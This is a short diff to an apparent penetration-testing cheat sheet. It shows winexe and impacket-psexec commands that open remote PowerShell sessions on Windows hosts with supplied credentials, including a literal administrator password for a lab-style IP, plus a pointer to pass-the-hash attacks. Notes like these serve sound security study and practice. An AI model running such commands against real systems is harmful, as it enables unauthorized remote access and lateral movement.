@@ -553,8 +553,7 @@ winexe -U 'user%password' //$RHOST powershell.exe
 winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
 ```
 ```
-impacket-psexec user@$RHOST powershell
-Enter Password:
+impacket-psexec $USERNAME:'$PASSWORD'@$RHOST powershell
 ```
 
 **If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe**
